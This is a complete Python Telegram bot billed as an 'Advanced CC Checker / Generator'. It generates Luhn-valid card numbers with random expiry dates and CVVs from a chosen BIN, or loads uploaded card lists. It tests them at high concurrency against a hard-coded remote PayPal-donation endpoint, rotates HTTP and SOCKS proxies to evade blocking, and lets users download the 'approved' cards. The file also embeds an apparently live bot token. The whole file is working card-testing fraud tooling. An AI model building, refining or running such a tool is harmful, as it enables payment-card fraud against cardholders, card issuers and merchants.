#!/usr/bin/env python3
"""
Advanced Telegram CC Checker / Generator Bot
- Luhn generation
- Mass / continuous check
- Multi-type proxy rotation
- Live dashboard & result downloads
Token: Pre-configured
"""

import asyncio
import logging
import random
import re
from io import BytesIO
from typing import Dict, List, Optional, Tuple

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- Configuration ---
TELEGRAM_BOT_TOKEN = "8582836532:AAE7IXU5jrxPS1l-Z1DkLYQMwoDtekv9gsE"
API_URL = "http://199.244.48.163:8025/paypal_donate"
TIMEOUT = aiohttp.ClientTimeout(total=15)
MAX_CONCURRENT_REQUESTS = 200
DASHBOARD_UPDATE_INTERVAL = 1.5
MAX_STORED_CARDS = 100_000
MAX_SOCKS_SESSIONS = 50  # limit for SOCKS proxy sessions

# --- Logging ---
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Luhn & Card Utilities (unchanged) ---
def luhn_checksum(card_number: str) -> int:
    digits = [int(d) for d in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return (10 - (total % 10)) % 10

def generate_card(bin_prefix: str) -> str:
    remaining_length = 15 - len(bin_prefix)
    if remaining_length < 0:
        raise ValueError("BIN too long (max 15 digits for a 16-digit card)")
    random_part = ''.join(str(random.randint(0, 9)) for _ in range(remaining_length))
    partial = bin_prefix + random_part
    check_digit = luhn_checksum(partial)
    return partial + str(check_digit)

def generate_expiry_cvv() -> Tuple[str, str]:
    month = f"{random.randint(1, 12):02d}"
    year = random.randint(2027, 2032)
    cvv = f"{random.randint(0, 999):03d}"
    return f"{month}|{year}", cvv

def parse_card_line(line: str) -> Optional[str]:
    line = line.strip()
    if not line:
        return None
    parts = line.split("|")
    if len(parts) != 4:
        return None
    if len(parts[2]) == 2:
        parts[2] = "20" + parts[2]
    elif len(parts[2]) != 4:
        return None
    if not (parts[0].isdigit() and 13 <= len(parts[0]) <= 19):
        return None
    if not (parts[1].isdigit() and 1 <= int(parts[1]) <= 12):
        return None
    if not (parts[2].isdigit() and len(parts[2]) == 4):
        return None
    if not (parts[3].isdigit() and len(parts[3]) == 3):
        return None
    return f"{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}"

# --- Proxy Manager ---
class ProxyManager:
    """
    Handles loading, rotation, and validation of HTTP/HTTPS/SOCKS proxies.
    Each proxy string format:
        - protocol://user:pass@host:port
        - protocol://host:port
        - host:port (default http)
    Supported protocols: http, https, socks4, socks5
    """
    def __init__(self):
        self.proxies: List[dict] = []  # each: {"url": str, "type": str, "session": Optional[ClientSession]}
        self.lock = asyncio.Lock()
        self.socks_sessions: Dict[str, aiohttp.ClientSession] = {}  # cache for SOCKS
        self.index = 0  # round-robin counter

    def load_from_lines(self, lines: List[str]) -> int:
        """Parse lines and add valid proxies. Returns count added."""
        added = 0
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            proxy_url = self._normalize_proxy(line)
            if proxy_url:
                self.proxies.append({
                    "url": proxy_url,
                    "type": self._get_proxy_type(proxy_url),
                    "failures": 0
                })
                added += 1
        return added

    def _normalize_proxy(self, raw: str) -> Optional[str]:
        """Convert raw proxy string to full URL (scheme://[user:pass@]host:port)."""
        # If already has scheme
        if "://" in raw:
            return raw
        # Otherwise assume http://
        return f"http://{raw}"

    def _get_proxy_type(self, url: str) -> str:
        """Return 'http', 'https', 'socks4', 'socks5'."""
        scheme = url.split("://")[0].lower()
        if scheme in ("socks4", "socks5", "http", "https"):
            return scheme
        return "http"

    async def get_proxy_session(self) -> Tuple[Optional[str], Optional[aiohttp.ClientSession]]:
        """
        Return (proxy_url, session) for the next proxy.
        If proxy is HTTP/HTTPS, session is None (use main session's proxy parameter).
        If SOCKS, a dedicated session is provided.
        If no proxies loaded, return (None, None) for direct connection.
        """
        async with self.lock:
            if not self.proxies:
                return None, None

            # Round-robin with retry skip
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.index]
                self.index = (self.index + 1) % len(self.proxies)
                # If too many recent failures, skip
                if proxy.get("failures", 0) >= 3:
                    attempts += 1
                    continue
                # For SOCKS, get or create dedicated session
                if proxy["type"] in ("socks4", "socks5"):
                    session = await self._get_socks_session(proxy["url"], proxy["type"])
                    return proxy["url"], session
                else:
                    return proxy["url"], None
            # All proxies seem dead, return first anyway
            proxy = self.proxies[0]
            if proxy["type"] in ("socks4", "socks5"):
                session = await self._get_socks_session(proxy["url"], proxy["type"])
                return proxy["url"], session
            return proxy["url"], None

    async def _get_socks_session(self, url: str, proxy_type: str) -> aiohttp.ClientSession:
        """Get or create a aiohttp session for a SOCKS proxy."""
        if url in self.socks_sessions:
            return self.socks_sessions[url]
        if len(self.socks_sessions) >= MAX_SOCKS_SESSIONS:
            # Remove oldest
            oldest = next(iter(self.socks_sessions))
            await self.socks_sessions[oldest].close()
            del self.socks_sessions[oldest]
        # Parse URL components
        # url format: socks5://user:pass@host:port
        connector = ProxyConnector.from_url(url)
        session = aiohttp.ClientSession(connector=connector, timeout=TIMEOUT)
        self.socks_sessions[url] = session
        return session

    def mark_failure(self, proxy_url: str):
        """Increase failure count for a proxy."""
        for p in self.proxies:
            if p["url"] == proxy_url:
                p["failures"] = p.get("failures", 0) + 1
                break

    def mark_success(self, proxy_url: str):
        """Reset failures on success."""
        for p in self.proxies:
            if p["url"] == proxy_url:
                p["failures"] = 0
                break

    def clear(self):
        self.proxies.clear()
        # Close all SOCKS sessions
        for sess in self.socks_sessions.values():
            asyncio.create_task(sess.close())
        self.socks_sessions.clear()

    @property
    def count(self) -> int:
        return len(self.proxies)

    @property
    def active_count(self) -> int:
        return sum(1 for p in self.proxies if p.get("failures", 0) < 3)

    async def close(self):
        """Cleanup all SOCKS sessions."""
        for sess in self.socks_sessions.values():
            await sess.close()
        self.socks_sessions.clear()

# --- Async HTTP Checker (modified to support proxies) ---
class CheckerSession:
    def __init__(self):
        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
        self.session: Optional[aiohttp.ClientSession] = None

    async def start(self):
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        self.session = aiohttp.ClientSession(connector=connector, timeout=TIMEOUT)

    async def close(self):
        if self.session:
            await self.session.close()

    async def check_card(self, card_str: str, proxy_url: Optional[str] = None,
                         socks_session: Optional[aiohttp.ClientSession] = None) -> Tuple[str, Optional[str]]:
        """
        Check card. Returns (status, used_proxy_url).
        proxy_url: if HTTP/HTTPS, passed as proxy parameter to the main session.
        socks_session: if provided, use this session instead (for SOCKS).
        """
        async with self.semaphore:
            try:
                if socks_session:
                    # Use dedicated SOCKS session
                    async with socks_session.get(API_URL, params={"cc": card_str}) as resp:
                        if resp.status != 200:
                            return "error", proxy_url
                        text = await resp.text()
                        if '"status":"DECLINED"' in text:
                            return "declined", proxy_url
                        else:
                            return "approved", proxy_url
                else:
                    # Use main session, possibly with proxy parameter
                    kwargs = {"params": {"cc": card_str}}
                    if proxy_url:
                        kwargs["proxy"] = proxy_url
                    async with self.session.get(API_URL, **kwargs) as resp:
                        if resp.status != 200:
                            return "error", proxy_url
                        text = await resp.text()
                        if '"status":"DECLINED"' in text:
                            return "declined", proxy_url
                        else:
                            return "approved", proxy_url
            except Exception as e:
                logger.debug(f"Request error: {e}")
                return "error", proxy_url

# --- User Session ---
class UserSession:
    def __init__(self, chat_id: int):
        self.chat_id = chat_id
        self.bin: Optional[str] = None
        self.running = False
        self.stop_event = asyncio.Event()
        self.task: Optional[asyncio.Task] = None
        self.dashboard_msg = None
        self.stats = {"total": 0, "declined": 0, "approved": 0, "errors": 0}
        self.approved_cards: List[str] = []
        self.declined_cards: List[str] = []
        self.error_cards: List[str] = []
        self.proxy_manager = ProxyManager()  # each user has own proxy pool

    def reset_results(self):
        self.approved_cards.clear()
        self.declined_cards.clear()
        self.error_cards.clear()
        self.stats = {"total": 0, "declined": 0, "approved": 0, "errors": 0}

    async def update_dashboard(self, bin_display: str):
        while self.running:
            try:
                if self.dashboard_msg:
                    msg = (
                        f"📊 **Live Check Dashboard**\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"Checking CC: {self.stats['total']} done\n"
                        f"Of this BIN: {bin_display}\n"
                        f"Declined: {self.stats['declined']}\n"
                        f"Approved: {self.stats['approved']}\n"
                        f"Errors: {self.stats['errors']}\n"
                        f"Proxies: {self.proxy_manager.active_count}/{self.proxy_manager.count} active\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"⚡ Speed: {MAX_CONCURRENT_REQUESTS} threads"
                    )
                    await self.dashboard_msg.edit_text(msg, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                logger.error(f"Dashboard update error: {e}")
            await asyncio.sleep(DASHBOARD_UPDATE_INTERVAL)

    def add_result(self, card_str: str, status: str):
        if status == "approved" and len(self.approved_cards) < MAX_STORED_CARDS:
            self.approved_cards.append(card_str)
        elif status == "declined" and len(self.declined_cards) < MAX_STORED_CARDS:
            self.declined_cards.append(card_str)
        elif status == "error" and len(self.error_cards) < MAX_STORED_CARDS:
            self.error_cards.append(card_str)
        self.stats[status] += 1
        self.stats["total"] += 1

# Global store
user_sessions: Dict[int, UserSession] = {}
checker = CheckerSession()

async def get_user_session(chat_id: int) -> UserSession:
    if chat_id not in user_sessions:
        user_sessions[chat_id] = UserSession(chat_id)
    return user_sessions[chat_id]

# --- Proxy-related Bot Commands ---
async def setproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add proxies from a text file (reply) or inline text."""
    session = await get_user_session(update.effective_chat.id)
    # If replying to a document (.txt)
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
        if not doc.file_name.endswith(".txt"):
            await update.message.reply_text("❌ Only .txt files allowed for proxy list.")
            return
        try:
            file = await context.bot.get_file(doc.file_id)
            buf = BytesIO()
            await file.download_to_memory(buf)
            buf.seek(0)
            lines = buf.read().decode("utf-8").splitlines()
        except Exception as e:
            await update.message.reply_text(f"❌ Error downloading file: {e}")
            return
    else:
        # Use text after command (e.g., /setproxy proxy1,proxy2)
        if not context.args:
            await update.message.reply_text(
                "Usage:\n"
                "/setproxy <proxy1,proxy2,...>   (comma-separated list)\n"
                "or reply to a .txt file with one proxy per line.\n\n"
                "Formats: http://host:port, socks5://user:pass@host:port, host:port"
            )
            return
        lines = " ".join(context.args).split(",")
    
    count = session.proxy_manager.load_from_lines(lines)
    await update.message.reply_text(f"✅ Loaded {count} proxies. Total: {session.proxy_manager.count}")

async def proxystatus_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    total = session.proxy_manager.count
    active = session.proxy_manager.active_count
    await update.message.reply_text(f"📡 Proxies loaded: {total}\n🟢 Active: {active}\n🔴 Dead: {total - active}")

async def clearproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    session.proxy_manager.clear()
    await update.message.reply_text("🗑 All proxies removed.")

# --- Core Check Tasks (modified to use proxies) ---
async def check_with_proxy(session: UserSession, card_str: str) -> str:
    """Perform a single check using the proxy manager, with retry on error."""
    max_retries = 3
    for attempt in range(max_retries):
        proxy_url, socks_sess = await session.proxy_manager.get_proxy_session()
        status, used_proxy = await checker.check_card(card_str, proxy_url, socks_sess)
        if status == "error":
            # Mark failure and retry
            if used_proxy:
                session.proxy_manager.mark_failure(used_proxy)
            await asyncio.sleep(0.1 * (attempt + 1))  # small backoff
            continue
        else:
            # Success or declined
            if used_proxy:
                session.proxy_manager.mark_success(used_proxy)
            return status
    return "error"

async def continuous_check_task(session: UserSession, bin_prefix: str):
    dashboard_task = asyncio.create_task(session.update_dashboard(bin_prefix))
    try:
        while not session.stop_event.is_set():
            cards = []
            for _ in range(100):
                try:
                    cc = generate_card(bin_prefix)
                    exp, cvv = generate_expiry_cvv()
                    cards.append(f"{cc}|{exp}|{cvv}")
                except Exception as e:
                    logger.error(f"Generation error: {e}")

            # Concurrent checks with proxies
            tasks = [check_with_proxy(session, c) for c in cards]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for card_str, res in zip(cards, results):
                if isinstance(res, Exception):
                    session.add_result(card_str, "error")
                else:
                    session.add_result(card_str, res)
            await asyncio.sleep(0)
    finally:
        session.running = False
        dashboard_task.cancel()
        try: await dashboard_task
        except asyncio.CancelledError: pass
        if session.dashboard_msg:
            try:
                final_msg = (
                    f"⏹ **Check Stopped**\n"
                    f"Total: {session.stats['total']}\n"
                    f"Approved: {session.stats['approved']}\n"
                    f"Declined: {session.stats['declined']}\n"
                    f"Errors: {session.stats['errors']}\n"
                    "Use /approved, /declined, /errors to download."
                )
                await session.dashboard_msg.edit_text(final_msg, parse_mode=ParseMode.MARKDOWN)
            except: pass

async def mass_check_task(session: UserSession, cards: list):
    bin_display = "Custom List"
    dashboard_task = asyncio.create_task(session.update_dashboard(bin_display))
    try:
        chunk_size = 200
        for i in range(0, len(cards), chunk_size):
            if session.stop_event.is_set():
                break
            chunk = cards[i:i+chunk_size]
            tasks = [check_with_proxy(session, c) for c in chunk]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for card_str, res in zip(chunk, results):
                if isinstance(res, Exception):
                    session.add_result(card_str, "error")
                else:
                    session.add_result(card_str, res)
            await asyncio.sleep(0)
    finally:
        session.running = False
        dashboard_task.cancel()
        try: await dashboard_task
        except asyncio.CancelledError: pass
        if session.dashboard_msg:
            try:
                final_msg = (
                    f"✅ **Mass Check Finished**\n"
                    f"Total: {session.stats['total']}\n"
                    f"Approved: {session.stats['approved']}\n"
                    f"Declined: {session.stats['declined']}\n"
                    f"Errors: {session.stats['errors']}\n"
                    "Download with /approved, /declined, /errors"
                )
                await session.dashboard_msg.edit_text(final_msg, parse_mode=ParseMode.MARKDOWN)
            except: pass

# --- Other commands (unchanged) ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🚀 **Advanced CC Checker Bot**\n\n"
        "**Commands:**\n"
        "/start – Show help\n"
        "/setbin <BIN> – Set BIN prefix\n"
        "/targetchk – Auto-generate & check\n"
        "/mchk – Mass check (reply to .txt)\n"
        "/stop – Stop current check\n"
        "/approved – Download approved.txt\n"
        "/declined – Download declined.txt\n"
        "/errors – Download errors.txt\n"
        "/results – Session stats\n\n"
        "**Proxy Commands:**\n"
        "/setproxy – Load proxies (reply .txt or text)\n"
        "/proxystatus – Show proxy stats\n"
        "/clearpoxy – Remove all proxies\n\n"
        "Proxy formats: `http://host:port`, `socks5://user:pass@host:port`, `host:port`"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def setbin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /setbin <BIN>")
        return
    bin_val = context.args[0].strip()
    if not bin_val.isdigit() or len(bin_val) < 4:
        await update.message.reply_text("❌ Invalid BIN")
        return
    session = await get_user_session(update.effective_chat.id)
    session.bin = bin_val
    await update.message.reply_text(f"✅ BIN set to `{bin_val}`", parse_mode=ParseMode.MARKDOWN)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if session.running:
        session.stop_event.set()
        await update.message.reply_text("⏹ Stopping...")
    else:
        await update.message.reply_text("No active check.")

async def targetchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if not session.bin:
        await update.message.reply_text("❌ Set a BIN first with /setbin")
        return
    if session.running:
        await update.message.reply_text("⚠ Already running")
        return
    session.stop_event.clear()
    session.reset_results()
    session.running = True
    msg = await update.message.reply_text("🔄 Continuous check started...")
    session.dashboard_msg = msg
    session.task = asyncio.create_task(continuous_check_task(session, session.bin))

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if session.running:
        await update.message.reply_text("⚠ Already running")
        return
    replied = update.message.reply_to_message
    if not replied or not replied.document:
        await update.message.reply_text("❌ Reply to a .txt file with cards (CC|MM|YY|CVV)")
        return
    doc = replied.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Only .txt files")
        return
    status_msg = await update.message.reply_text("⏳ Downloading file...")
    try:
        file = await context.bot.get_file(doc.file_id)
        buf = BytesIO()
        await file.download_to_memory(buf)
        buf.seek(0)
        lines = buf.read().decode("utf-8").splitlines()
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {e}")
        return
    cards = [parse_card_line(line) for line in lines if parse_card_line(line)]
    if not cards:
        await status_msg.edit_text("❌ No valid cards found.")
        return
    await status_msg.edit_text(f"✅ {len(cards)} cards loaded. Starting...")
    session.stop_event.clear()
    session.reset_results()
    session.running = True
    msg = await update.message.reply_text("🔄 Mass check started...")
    session.dashboard_msg = msg
    session.task = asyncio.create_task(mass_check_task(session, cards))

async def approved_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if not session.approved_cards:
        await update.message.reply_text("ℹ No approved cards.")
        return
    buf = BytesIO("\n".join(session.approved_cards).encode("utf-8"))
    await update.message.reply_document(document=buf, filename="approved.txt")

async def declined_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if not session.declined_cards:
        await update.message.reply_text("ℹ No declined cards.")
        return
    buf = BytesIO("\n".join(session.declined_cards).encode("utf-8"))
    await update.message.reply_document(document=buf, filename="declined.txt")

async def errors_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if not session.error_cards:
        await update.message.reply_text("ℹ No error cards.")
        return
    buf = BytesIO("\n".join(session.error_cards).encode("utf-8"))
    await update.message.reply_document(document=buf, filename="errors.txt")

async def results_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if session.stats['total'] == 0:
        await update.message.reply_text("ℹ No checks performed.")
        return
    msg = (
        f"📋 **Results**\n"
        f"Total: {session.stats['total']}\n"
        f"Approved: {session.stats['approved']}\n"
        f"Declined: {session.stats['declined']}\n"
        f"Errors: {session.stats['errors']}\n\n"
        "Download: /approved /declined /errors"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

# --- App Setup ---
async def post_init(application: Application):
    await checker.start()
    logger.info("Bot started with proxy support.")

async def post_shutdown(application: Application):
    await checker.close()
    # Close all user proxy sessions
    for sess in user_sessions.values():
        await sess.proxy_manager.close()
    logger.info("Bot shutdown.")

def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).post_init(post_init).post_shutdown(post_shutdown).build()
    # Core commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("setbin", setbin_command))
    app.add_handler(CommandHandler("targetchk", targetchk_command))
    app.add_handler(CommandHandler("mchk", mchk_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("approved", approved_command))
    app.add_handler(CommandHandler("declined", declined_command))
    app.add_handler(CommandHandler("errors", errors_command))
    app.add_handler(CommandHandler("results", results_command))
    # Proxy commands
    app.add_handler(CommandHandler("setproxy", setproxy_command))
    app.add_handler(CommandHandler("proxystatus", proxystatus_command))
    app.add_handler(CommandHandler("clearpoxy", clearproxy_command))

    print("🤖 Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
